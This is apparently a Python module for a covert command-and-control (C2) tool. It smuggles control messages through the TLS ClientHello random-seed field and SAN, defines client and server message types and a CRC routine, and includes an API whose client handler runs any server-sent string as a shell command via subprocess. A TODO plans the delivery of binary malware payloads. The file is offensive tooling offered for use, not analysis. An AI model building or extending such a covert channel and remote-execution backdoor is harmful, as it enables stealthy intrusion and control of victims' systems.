# -*- coding: utf-8 -*-

"""
    PROTOCOL:

    Use *TLS Random Seed Field* (32 bytes) for our 'Protocol Control Channel' - This is analogous to a TCP Segment Header
    NOTE: We cannot use random seed field in the server -to-> client direction. Need to use SAN for that

    Length      Field
    ------------------------
    [2 bytes]   Client ID [max 65k clients] ;; TCP Analog: Source Port + Dest Port (Session ID)
    [2 bytes]   Message Type (*** See Message Schema Below ***)
    [4 bytes]   Payload Length (Total length of message we are sending) [2^32] ~ 4GB
    [4 bytes]   Sequence Number [Used for fragmentation - Will never exceed Payload Length]
    [4 bytes]   Checksum (CRC) - Integrety check on PAYLOAD
    [8 bytes]   Session ID - To uniquely idendify a session
    [16 bytes]  _UNUSED_

"""

"""
    MESSAGE TYPE  (CLIENT):

    SEE class ClientMessage
    
"""

"""
    MESSAGE TYPE  (SERVER):

    SEE class ServerMessage
    
"""

import random
import subprocess


class Message:
    def __init__(self):
        self.header = b"\x00" * 4
        self.body = b"\x00" * 20
        self.payload = b"\x00" * 8

    def to_bytes(self):
        return self.header + self.body + self.payload

    def hex(self) -> str:
        return (self.header + self.body + self.payload).hex()

    def set(self, random_seed: bytes) -> None:
        self.header = random_seed[:4]
        self.body = random_seed[4:24]
        self.payload = random_seed[24:32]

    def get_client_id(self, random_seed: bytes) -> bytes:
        if not random_seed:
            random_seed = self.header + self.body + self.payload
        return random_seed[:2]

    def get_msg_type(self, random_seed: bytes) -> bytes:
        if not random_seed:
            random_seed = self.header + self.body + self.payload
        return random_seed[2:4]

    def get_payload_len(self, random_seed: bytes) -> bytes:
        if not random_seed:
            random_seed = self.header + self.body + self.payload
        return random_seed[4:8]

    def get_sequence_num(self, random_seed: bytes) -> bytes:
        if not random_seed:
            random_seed = self.header + self.body + self.payload
        return random_seed[8:12]

    def get_crc(self, random_seed: bytes) -> bytes:
        if not random_seed:
            random_seed = self.header + self.body + self.payload
        return random_seed[12:16]

    def get_session_id(self, random_seed: bytes) -> bytes:
        if not random_seed:
            random_seed = self.header + self.body + self.payload
        return random_seed[16:24]

    def get_payload(self, random_seed: bytes) -> bytes:
        if not random_seed:
            random_seed = self.header + self.body + self.payload
        return random_seed[24:32]

    @staticmethod
    def compute_crc(message: bytes) -> int:
        # https://stackoverflow.com/questions/63702118/custom-crc32-calculation-in-python-without-libs
        crc_table = []
        for i in range(256):
            k = i << 24
            for _ in range(8):
                k = (k << 1) ^ 0x4C11DB7 if k & 0x80000000 else k << 1
            crc_table.append(k & 0xFFFFFFFF)
        crc = 0xFFFFFFFF
        for byte in message:
            lookup_index = ((crc >> 24) ^ byte) & 0xFF
            crc = ((crc & 0xFFFFFF) << 8) ^ crc_table[lookup_index]
        return crc


class ClientMessage(Message):
    CONNECT = b"\x00\x01"
    POLL = b"\x00\x02"
    ACK = b"\x00\x03"
    RESPONSE = b"\x00\x04"
    FRAGMENT = b"\x00\x05"
    CRC_ERROR = b"\x00\x06"
    TEST = b"\x00\x07"

    def __init__(self):
        pass

    def connect(self) -> bytes:
        m = Message()
        m.header = bytes([random.randrange(0, 256) for _ in range(0, 2)]) + self.CONNECT
        return m.header + m.body + m.payload

    def test(self) -> bytes:
        m = Message()
        m.header = bytes([random.randrange(0, 256) for _ in range(0, 2)]) + self.TEST
        return m.header + m.body + m.payload

    def heartbeat(self, client_id: bytes) -> bytes:
        m = Message()
        m.header = client_id + self.POLL
        return m.to_bytes()

    def type_to_text(self, msg_type: bytes) -> str:
        if msg_type == self.CONNECT:
            return "CONNECT"
        if msg_type == self.POLL:
            return "POLL"
        if msg_type == self.ACK:
            return "ACK"
        if msg_type == self.RESPONSE:
            return "RESPONSE"
        if msg_type == self.FRAGMENT:
            return "FRAGMENT"
        if msg_type == self.CRC_ERROR:
            return "CRC_ERROR"
        if msg_type == self.TEST:
            return "TEST"
        return "__INVALID_MSG_TYPE"


class ServerMessage(Message):
    ACK = b"\x00\x01"
    CMD_AVAILABLE = b"\x00\x02"
    REQUEST = b"\x00\x03"
    FRAGMENT = b"\x00\x04"
    CRC_ERROR = b"\x00\x05"
    ABORT = b"\x00\x06"
    SNI_DECODE_FAILED = b"\x00\x07"
    UNKNOWN = b"\xff\xff"

    def __init__(self):
        pass


class API:
    """This is the higher level API for our C2 app"""

    # TODO: Need more here for the API to be fully operational
    def client_handle(self, request: bytes) -> bytes:
        # TODO: For now, we assume all messages from the server are string commands to exec
        # TODO: Need to extend this out to handle DATA INFILL (for delivering arbitrary payloads, like binary malware)
        return self._run_command(request)

    def server_handle(self, request: bytes) -> bytes:
        pass

    def _run_command(self, cmd: str) -> str:
        cmds = cmd.split(" ")
        return subprocess.check_output(cmds)

    @staticmethod
    def gen_session_id() -> bytes:
        return bytes([random.randrange(0, 256) for _ in range(0, 8)])
